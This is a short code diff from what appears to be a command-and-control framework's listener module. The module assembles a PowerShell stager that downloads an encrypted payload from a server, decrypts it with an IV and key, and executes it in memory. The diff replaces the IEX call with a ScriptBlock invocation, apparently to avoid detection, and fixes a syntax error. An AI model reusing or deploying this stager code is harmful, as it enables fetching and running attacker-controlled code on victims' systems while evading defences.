@@ -359,11 +359,11 @@ class Listener:
             stager += "$mdata=$wc.DownloadData($hom+$t);"
             stager += "$iv=$mdata[0..3];$mdata=$mdata[4..$mdata.length];"
             
-            stager += "function goForIT ($rdata) {IEX -Command $($rdata)};"
+            stager += "function goForIT ($rdata) {([ScriptBlock]::Create($rdata)).Invoke()};"
             stager += "0..300 | ForEach-Object { $t12=$_+$T12 };"
 
             # decode everything and kick it over to IEX to kick off execution
-            stager += "$t5 = -join[Char[]](& $M $mdata ($IV+$Kk)); goForIT $T5);"
+            stager += "$t5 = -join[Char[]](& $M $mdata ($IV+$Kk)); goForIT $T5;"
 
             # Remove comments and make one line
             stager = helpers.strip_powershell_comments(stager)
